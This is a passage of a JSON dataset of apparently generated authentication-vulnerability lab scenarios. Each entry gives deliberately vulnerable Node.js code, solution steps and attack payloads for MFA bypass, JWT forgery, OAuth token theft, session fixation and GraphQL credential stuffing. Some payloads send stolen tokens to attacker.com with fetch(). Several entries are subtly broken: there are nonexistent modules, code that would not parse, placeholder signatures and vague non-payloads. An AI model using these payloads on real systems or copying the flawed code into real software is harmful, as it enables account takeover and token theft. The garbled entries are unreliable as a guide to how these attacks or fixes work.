      "Resend the request with status set to 'verified' to bypass MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use(express.json());const users = {'user1':{password:'pass123',mfaSecret:'MFA123'}};app.post('/verify-mfa',(req,res)=>{const{username,code,status}=req.body;if(status==='verified'||(users[username]&&code===users[username].mfaSecret)){res.json({access_token:'token123'});}});app.listen(3000);",
    "payloads": [
      "{\"username\":\"user1\",\"code\":\"123456\",\"status\":\"pending\"}",
      "{\"username\":\"user1\",\"status\":\"verified\"}"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice architecture",
    "Lab Description": "The JWT validation service improperly processes the kid header, allowing path traversal to load arbitrary verification keys. The application trusts unsigned tokens when key loading fails. To solve: forge a valid admin token by forcing the system to use a predictable key file.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT with Burp Suite and note the kid header value",
      "Modify the kid header to traverse directories (../../../../etc/passwd)",
      "Observe the server error revealing the filesystem structure",
      "Craft a token with kid pointing to a predictable key location",
      "Sign the forged token with the discovered key and access admin endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();app.get('/admin',(req,res)=>{const token = req.headers.authorization?.split(' ')[1];try{const decoded = jwt.verify(token,(header,callback)=>{fs.readFile(`/keys/${header.kid}`,(err,key)=>{callback(null,err?'weaksecret':key);});});if(decoded.role==='admin')res.send('Admin access');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QiLCJ0eXAiOiJKV1QifQ.eyJyb2xlIjoidXNlciJ9.1yBq9M7hU0QqJ8w4jK9nX8zK1vY5rA7sC2dE3fG4hI",
      "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uL2tleXMvcHVibGljLmtleSIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.Kq4l5K8jN2m3P6o9R1sT4uV7wX0yZ2A1B3C5D7E8F"
    ]
  },
  {
    "Lab scenario": "OAuth state parameter CSRF with JSONP callback",
    "Lab Description": "The OAuth implementation accepts state parameters via JSONP callbacks, enabling CSRF attacks. The application fails to validate the state parameter origin during token exchange. To solve: craft a malicious site that steals OAuth tokens via automatic callback execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify the OAuth flow using OWASP ZAP's forced browsing",
      "Note the JSONP callback parameter in the redirect URI",
      "Create an HTML page with malicious state parameter",
      "Embed the page with auto-executing callback script",
      "Trick an admin into visiting the page to capture their token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback',(req,res)=>{const{state,code}=req.query;if(/^[a-z0-9]+$/i.test(state)){res.send(`<script>window.opener.postMessage({'state':'${state}','token':'${code}'},'*')</script>`);}else{res.json({access_token:'generated_token'});}});app.listen(3000);",
    "payloads": [
      "https://oauth-provider.com/auth?client_id=123&redirect_uri=attacker.com/cb&state=<script>alert(1)</script>",
      "https://oauth-provider.com/auth?client_id=123&redirect_uri=attacker.com/cb&state=malicious&response_type=token"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket handshake",
    "Lab Description": "The WebSocket connection handshake accepts arbitrary session identifiers, allowing session fixation attacks. The application reuses HTTP session tokens for WebSocket authentication without regeneration. To solve: establish a WebSocket connection with a fixed session ID and trick a user into adopting it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to establish a WebSocket connection",
      "Note the Session-ID header in the handshake request",
      "Craft a malicious link with a fixed session ID",
      "Force the victim to connect using your session ID",
      "Monitor the WebSocket channel for sensitive data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const wss = new WebSocket.Server({ noServer: true });app.use((req,res,next)=>{if(!req.cookies.session)res.cookie('session',require('crypto').randomBytes(16).toString('hex'));next();});const server = app.listen(3000);server.on('upgrade',(req,socket,head)=>{wss.handleUpgrade(req,socket,head,(ws)=>{ws.session=req.headers['session-id']||req.cookies.session;wss.emit('connection',ws,req);});});wss.on('connection',(ws)=>{ws.send(`Connected as ${ws.session}`);});",
    "payloads": [
      "wss://vulnerable.com/chat?session_id=fixed-session-123",
      "https://vulnerable.com/ws-handshake?session_id=fixed-session-123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via race condition",
    "Lab Description": "The multi-factor authentication endpoint is vulnerable to race conditions during verification state checks. The application uses non-atomic operations to update MFA status. To solve: send parallel verification requests to bypass MFA before the state is finalized.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the MFA verification request with Burp Suite",
      "Send the request to Turbo Intruder",
      "Configure 50 parallel requests with 1ms delay",
      "Monitor for successful bypass responses",
      "Reuse the session from successful responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();let mfaStatus = {};app.post('/verify-mfa',(req,res)=>{const{user,token}=req.body;if(!mfaStatus[user])mfaStatus[user]={verified:false};if(token==='123456'){setTimeout(()=>{mfaStatus[user].verified=true;},1000);}if(mfaStatus[user].verified)res.json({access:'granted'});else res.status(403).send('Denied');});app.listen(3000);",
    "payloads": [
      "POST /verify-mfa HTTP/1.1\nContent-Type: application/json\n\n{\"user\":\"admin\",\"token\":\"123456\"}",
      "POST /verify-mfa HTTP/1.1\nContent-Type: application/json\n\n{\"user\":\"admin\",\"token\":\"111111\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via GraphQL batch queries",
    "Lab Description": "The GraphQL endpoint allows unlimited batch authentication attempts in a single request. The application fails to implement rate limiting on batched operations. To solve: craft a batch query testing 100+ credential pairs against the login mutation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover the GraphQL endpoint using OWASP ZAP",
      "Capture a valid login mutation with Postman",
      "Construct a batch query with 100+ credential variations",
      "Use parallel requests to maximize attempt rate",
      "Identify successful logins from response variations"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { graphqlHTTP } = require('express-graphql');const { buildSchema } = require('graphql');const schema = buildSchema(`type Mutation { login(username: String!, password: String!): String }`);const root = {login:({username,password})=>username==='admin'&&password==='Admin123!'?'valid':'invalid'};const app = express();app.use('/graphql',graphqlHTTP({schema,rootValue:root}));app.listen(3000);",
    "payloads": [
      "{\"query\":\"mutation {login1:login(username:\\\"admin\\\",password:\\\"password1\\\") login2:login(username:\\\"admin\\\",password:\\\"password2\\\")}\"}",
      "{\"query\":\"mutation {logins:batchLogin(creds:[{user:\\\"admin\\\",pass:\\\"Admin123!\\\"}])}\"}"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header injection",
    "Lab Description": "The JWT validation endpoint improperly trusts the jku header to fetch verification keys from external domains. The application fails to validate the jku domain against an allowlist. To solve: host a malicious JWKS file and forge admin tokens by injecting your jku endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT with Burp Suite and note the jku header absence",
      "Set up a web server hosting a crafted JWKS file with your public key",
      "Forge a token with jku pointing to your server and admin claims",
      "Sign the token with your private key matching the JWKS file",
      "Submit the token to bypass authentication"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const axios = require('axios');const app = express();app.get('/admin',(req,res)=>{const token = req.headers.authorization?.split(' ')[1];try{const decoded = jwt.verify(token,async (header,callback)=>{try{const jwks = await axios.get(header.jku);const key = jwks.data.keys.find(k=>k.kid===header.kid);callback(null,key?key.x5c[0]:'invalid');}catch(e){callback(null,'invalid');}});if(decoded.role==='admin')res.send('Admin access');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2p3a3MuanNvbiIsImtpZCI6Im1hbGljaW91cy1rZXkifQ.eyJyb2xlIjoiYWRtaW4ifQ.FAKE_SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXZpbC5jb20vandrcyIsImtpZCI6IjEyMyJ9.eyJ1c2VyIjoiYWRtaW4ifQ.INVALID_SIG"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via iframe CSP bypass",
    "Lab Description": "The OAuth callback page embeds user-sensitive tokens in URL fragments while having overly permissive CSP headers. The application fails to strip tokens from history.pushState calls. To solve: craft a malicious page that exfiltrates tokens via CSP-bypassed iframe techniques.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze the OAuth flow with OWASP ZAP to identify token leakage",
      "Note the CSP headers allowing unsafe-inline scripts",
      "Create an HTML page with history manipulation scripts",
      "Embed the OAuth callback URL in a hidden iframe",
      "Capture tokens via postMessage event listeners"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use((req,res,next)=>{res.set('Content-Security-Policy',\"script-src 'self' 'unsafe-inline'\");next();});app.get('/oauth/callback',(req,res)=>{const token = req.url.split('#')[1];res.send(`<script>window.opener.postMessage({token:'${token}'},'*');history.pushState({},'','/callback#${token}')</script>`);});app.listen(3000);",
    "payloads": [
      "<iframe src=\"https://oauth-victim.com/callback#leaked-token\"></iframe>",
      "<script>window.addEventListener('message',(e)=>{fetch('https://attacker.com/?token='+e.data.token)})</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 trailer headers",
    "Lab Description": "The application processes session identifiers from HTTP/2 trailer headers after main headers, allowing session fixation. The server fails to validate trailer header timing. To solve: craft HTTP/2 requests with malicious session IDs in trailers to override legitimate sessions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid session request with Burp Suite HTTP/2 plugin",
      "Modify the request to include session trailer headers",
      "Use custom tooling to send headers after main request",
      "Verify session override via subsequent authenticated requests",
      "Maintain access with the fixed session ID"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');const fs = require('fs');const server = http2.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});let sessions = {};server.on('stream',(stream,headers)=>{let sessionId = headers['session-id'];stream.on('trailers',(trailers)=>{sessionId = trailers['session-id']||sessionId;});if(!sessions[sessionId])sessions[sessionId]={authenticated:false};stream.respond({'content-type':'text/html'});stream.end(`Session ${sessionId}: ${sessions[sessionId].authenticated?'Authenticated':'Anonymous'}`);});server.listen(443);",
    "payloads": [
      "GET / HTTP/2\nHost: victim.com\nsession-id: legit-id\n\ntrailers: session-id\nsession-id: malicious-id\n\n",
      "POST /login HTTP/2\nHost: victim.com\n\ntrailers: session-id\nsession-id: fixed-session-123\n\nusername=admin&password=admin123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via WebAuthn replay",
    "Lab Description": "The WebAuthn implementation fails to properly validate challenge nonces, allowing authentication replay attacks. The server accepts previously used assertion signatures. To solve: intercept a valid WebAuthn assertion and replay it to bypass MFA.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a successful WebAuthn authentication with Burp Suite",
      "Save the authenticatorData, clientDataJSON, and signature",
      "Replay the assertion with identical values",
      "Bypass MFA by submitting the replayed assertion",
      "Access protected resources without MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();let challenges = {};app.post('/webauthn/auth',(req,res)=>{const{id,rawId,response}=req.body;if(response.authenticatorData&&response.clientDataJSON&&response.signature){res.json({status:'ok',token:'authenticated'});}else{res.status(403).json({error:'Invalid assertion'});}});app.listen(3000);",
    "payloads": [
      "{\"id\":\"ABCD\",\"rawId\":\"ABCD\",\"response\":{\"authenticatorData\":\"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAA\",\"clientDataJSON\":\"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiLCJvcmlnaW4iOiJodHRwOi8vbG9jYWxob3N0OjMwMDAiLCJjcm9zc09yaWdpbiI6ZmFsc2V9\",\"signature\":\"MEUCIQ...\"}}",
      "{\"id\":\"1234\",\"response\":{\"authenticatorData\":\"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAA\",\"clientDataJSON\":\"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiLCJvcmlnaW4iOiJodHRwOi8vbG9jYWxob3N0OjMwMDAifQ\",\"signature\":\"MEQCIF...\"}}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via GraphQL aliases",
    "Lab Description": "The GraphQL endpoint allows unlimited authentication attempts using query aliases in a single request. The application fails to rate limit aliased operations. To solve: craft a single query with 100+ aliased login attempts to brute-force credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover the GraphQL endpoint using introspection",
      "Analyze the login mutation with Postman",
      "Generate a list of common credential pairs",
      "Construct a query with aliased login attempts for each pair",
      "Identify successful logins from the batch response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { graphqlHTTP } = require('express-graphql');const { buildSchema } = require('graphql');const schema = buildSchema(`type Mutation { login(username: String!, password: String!): String }`);const root = {login:({username,password})=>username==='admin'&&password==='p@ssw0rd'?'valid':'invalid'};const app = express();app.use('/graphql',graphqlHTTP({schema,rootValue:root}));app.listen(3000);",
    "payloads": [
      "{\"query\":\"mutation {attempt1:login(username:\\\"admin\\\",password:\\\"password1\\\") attempt2:login(username:\\\"admin\\\",password:\\\"password2\\\")}\"}",
      "{\"query\":\"mutation {login1:login(username:\\\"user1\\\",password:\\\"pass1\\\") login2:login(username:\\\"user2\\\",password:\\\"pass2\\\") ...login100:login(username:\\\"user100\\\",password:\\\"pass100\\\")}\"}"
    ]
  },
  {
    "Lab scenario": "JWT signature stripping via nested JSON parser",
    "Lab Description": "The JWT validation service improperly processes nested JSON structures in token claims, allowing signature verification bypass. The application fails to validate the complete token structure when encountering nested objects. To solve: craft a JWT with nested claims that bypasses signature verification while maintaining admin privileges.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT with Burp Suite and decode its structure",
      "Identify the claim used for privilege assignment (e.g., 'role')",
      "Construct a nested JSON object within the claims: {'role':{'admin':true}}",
      "Strip the signature portion while maintaining valid JWT format",
      "Submit the modified token to gain admin access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin',(req,res)=>{const token = req.headers.authorization?.split(' ')[1];try{const decoded = jwt.decode(token,{json:true});if(decoded?.role?.admin||decoded.role==='admin'){res.send('Admin access granted');}else{res.status(403).send('Access denied');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjp7ImFkbWluIjp0cnVlfX0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcml2cyI6eyJhZG1pbiI6dHJ1fX0."
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via dangling callback parameters",
    "Lab Description": "The OAuth implementation retains callback parameters in client-side storage after authentication, allowing token theft via DOM-based XSS. The application fails to clear sensitive OAuth state from browser storage post-authentication. To solve: craft a malicious page that extracts OAuth tokens from residual callback parameters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze the OAuth flow with OWASP ZAP to identify parameter retention",
      "Note the client-side storage mechanism (localStorage/sessionStorage)",
      "Create a page with XSS payload targeting the callback parameter storage",
      "Trick an authenticated user into visiting the malicious page",
      "Capture the OAuth tokens via the XSS payload"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback',(req,res)=>{const{token}=req.query;res.send(`<script>localStorage.setItem('oauth_state',JSON.stringify({token:'${token}'}));window.location='/welcome'</script>`);});app.get('/welcome',(req,res)=>{res.sendFile(__dirname+'/welcome.html');});app.listen(3000);",
    "payloads": [
      "<img src=x onerror=alert(localStorage.getItem('oauth_state'))>",
      "<script>fetch('https://attacker.com/?token='+JSON.parse(localStorage.oauth_state).token)</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/3 early data",
    "Lab Description": "The application accepts session identifiers in HTTP/3 early data (0-RTT) before TLS handshake completion, allowing session fixation. The server fails to validate session creation timing. To solve: craft HTTP/3 requests with malicious session IDs in early data to override legitimate sessions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid session request with HTTP/3 capable proxy",
      "Modify the request to include session ID in early data",
      "Use custom tooling to send early data before handshake",
      "Verify session override via subsequent authenticated requests",
      "Maintain access with the fixed session ID"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http3 = require('http3');const fs = require('fs');const options = {key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem'),earlyData:true};const server = http3.createSecureServer(options);let sessions = {};server.on('request',(req,res)=>{const sessionId = req.headers['x-session-id']||req.socket.earlyData?.toString();if(!sessions[sessionId])sessions[sessionId]={authenticated:false};res.end(`Session ${sessionId}: ${sessions[sessionId].authenticated?'Authenticated':'Anonymous'}`);});server.listen(443);",
    "payloads": [
      "GET / HTTP/3\nx-session-id: fixed-session-123\n\n[0-RTT data]",
      "POST /login HTTP/3\n\n[0-RTT data: x-session-id=fixed-session-456]\n\nusername=admin&password=admin123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via biometric replay",
    "Lab Description": "The biometric authentication endpoint accepts previously recorded biometric data, allowing replay attacks. The server fails to validate liveness indicators in biometric submissions. To solve: intercept a valid biometric authentication and replay it to bypass MFA.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a successful biometric authentication with Burp Suite",
      "Save the biometric data packet (e.g., fingerprint template)",
      "Replay the biometric data with identical values",
      "Bypass MFA by submitting the replayed biometric data",
      "Access protected resources without MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/biometric-auth',(req,res)=>{const{biometricData}=req.body;if(biometricData.match(/^[a-f0-9]{64}$/)){res.json({status:'authenticated',token:'valid'});}else{res.status(403).json({error:'Invalid biometric data'});}});app.listen(3000);",
    "payloads": [
      "{\"biometricData\":\"deadbeefcafebabedeadbeefcafebabedeadbeefcafebabedeadbeefcafebabe\"}",
      "{\"biometricData\":\"0000000000000000000000000000000000000000000000000000000000000000\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via GraphQL directive overloading",
    "Lab Description": "The GraphQL endpoint allows unlimited authentication attempts using query directives in a single request. The application fails to rate limit directive-processed operations. To solve: craft a single query with 100+ directive-modified login attempts to brute-force credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover the GraphQL endpoint using introspection",
      "Analyze the login mutation with Postman",
      "Generate a list of common credential pairs",
      "Construct a query with directive-modified login attempts for each pair",
      "Identify successful logins from the batch response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { graphqlHTTP } = require('express-graphql');const { buildSchema } = require('graphql');const schema = buildSchema(`directive @attempt(n:Int) on FIELD|FRAGMENT_SPREAD|INLINE_FRAGMENT type Mutation { login(username: String!, password: String!): String }`);const root = {login:({username,password})=>username==='admin'&&password==='Secur3P@ss'?'valid':'invalid'};const app = express();app.use('/graphql',graphqlHTTP({schema,rootValue:root}));app.listen(3000);",
    "payloads": [
      "{\"query\":\"mutation {login(username:\\\"admin\\\",password:\\\"password1\\\") @attempt(n:100)}\"}",
      "{\"query\":\"mutation {login(username:\\\"user\\\",password:\\\"pass\\\") @attempt(n:500)...login(username:\\\"admin\\\",password:\\\"Secur3P@ss\\\") @attempt(n:1)}\"}"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via key wrapping",
    "Lab Description": "The JWT endpoint accepts wrapped encryption keys in the header, allowing algorithm confusion attacks. The application fails to validate key wrapping parameters against the specified algorithm. To solve: craft a token with mismatched algorithm declarations to bypass signature verification.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT with Burp Suite and analyze header structure",
      "Note the key wrapping parameters in the protected header",
      "Modify the algorithm declaration while keeping the same key material",
      "Sign the token with HS256 using the RSA public key as HMAC secret",
      "Submit the algorithm-confused token to bypass authentication"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin',(req,res)=>{const token = req.headers.authorization?.split(' ')[1];try{jwt.verify(token,{algorithms:['RS256','HS256']},(header,cb)=>{cb(null,header.x5c?header.x5c[0]:'invalid');});res.send('Admin access');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsIng1YyI6WyJwdWJsaWNfa2V5Il19.eyJyb2xlIjoiYWRtaW4ifQ.fake_sig",
      "eyJhbGciOiJSUzI1NiIsImtpZCI6ImU5NzM0YjkwIn0.eyJpc3MiOiJodHRwczovL2V4YW1wbGUuY29tIn0.fake_sig"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebTransport session",
    "Lab Description": "The OAuth implementation stores tokens in WebTransport session state, which persists across origins. The application fails to isolate session storage between domains. To solve: craft a malicious page that accesses the victim's OAuth tokens via WebTransport session inheritance.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze the OAuth flow with Chrome DevTools Network panel",
      "Identify WebTransport session usage for token storage",
      "Create a page with WebTransport session inspection scripts",
      "Trick an authenticated user into visiting your domain",
      "Extract tokens from inherited WebTransport session state"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback',(req,res)=>{const{token}=req.query;res.send(`<script>sessionStorage.setItem('webtransport_oauth','${token}');window.location='/dashboard'</script>`);});app.listen(3000);",
    "payloads": [
      "<script>new WebTransport('https://victim.com').ready.then(t=>t.sessionState)</script>",
      "<iframe src=\"https://attacker.com/stealer.html\"></iframe>"
    ]
  },
  {
    "Lab scenario": "Session fixation via QUIC connection IDs",
    "Lab Description": "The application assigns session identifiers based on QUIC connection IDs, which can be predicted. The server fails to use cryptographic randomness for session ID generation. To solve: craft QUIC packets with predetermined connection IDs to fixate sessions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture QUIC handshake with specialized network tools",
      "Analyze connection ID generation pattern",
      "Predict next valid connection ID sequence",
      "Initiate connection with predetermined ID",
      "Trick victim into using the fixed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const quic = require('node-quic');const server = quic.createServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});server.on('session',(session)=>{session.id = session.connection.id.toString('hex');sessions[session.id] = session;});server.listen(443);",
    "payloads": [
      "QUIC packet with predictable connection ID",
      "Custom QUIC client with session fixation"
    ]
  },
  {
    "Lab scenario": "MFA bypass via FIDO2 assertion replay",
    "Lab Description": "The FIDO2 implementation fails to validate assertion counters, allowing replay attacks. The server accepts previously used authenticator assertions. To solve: intercept a valid FIDO2 assertion and replay it to bypass MFA.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a successful FIDO2 authentication with Burp Suite",
      "Save the authenticatorData, clientDataJSON, and signature",
      "Replay the assertion with identical values",
      "Bypass MFA by submitting the replayed assertion",
      "Access protected resources without MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/fido2-auth',(req,res)=>{const{assertion}=req.body;if(assertion.authenticatorData&&assertion.clientDataJSON){res.json({status:'authenticated'});}else{res.status(403).json({error:'Invalid assertion'});}});app.listen(3000);",
    "payloads": [
      "{\"assertion\":{\"authenticatorData\":\"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAA\",\"clientDataJSON\":\"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiLCJvcmlnaW4iOiJodHRwOi8vbG9jYWxob3N0OjMwMDAifQ\",\"signature\":\"MEQCIF...\"}}",
      "{\"id\":\"ABCD\",\"rawId\":\"ABCD\",\"response\":{\"authenticatorData\":\"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAA\",\"clientDataJSON\":\"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiLCJvcmlnaW4iOiJodHRwOi8vbG9jYWxob3N0OjMwMDAiLCJjcm9zc09yaWdpbiI6ZmFsc2V9\",\"signature\":\"MEUCIQ...\"}}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via GraphQL @defer directives",
    "Lab Description": "The GraphQL endpoint processes @defer directives sequentially, allowing unlimited authentication attempts. The application fails to rate limit deferred operations. To solve: craft a query with 100+ deferred login attempts to brute-force credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover the GraphQL endpoint using introspection",
      "Analyze the login mutation with Postman",
      "Generate a list of common credential pairs",
      "Construct a query with deferred login attempts for each pair",
      "Identify successful logins from the streamed responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { graphqlHTTP } = require('express-graphql');const { buildSchema } = require('graphql');const schema = buildSchema(`type Mutation { login(username: String!, password: String!): String }`);const root = {login:({username,password})=>username==='admin'&&password==='P@ssw0rd!'?'valid':'invalid'};const app = express();app.use('/graphql',graphqlHTTP({schema,rootValue:root}));app.listen(3000);",
    "payloads": [
      "{\"query\":\"mutation {login(username:\\\"admin\\\",password:\\\"password1\\\") @defer login(username:\\\"admin\\\",password:\\\"password2\\\") @defer}\"}",
      "{\"query\":\"mutation {login(username:\\\"user\\\",password:\\\"pass\\\") @defer ...login(username:\\\"admin\\\",password:\\\"P@ssw0rd!\\\") @defer}\"}"
    ]
  }
]
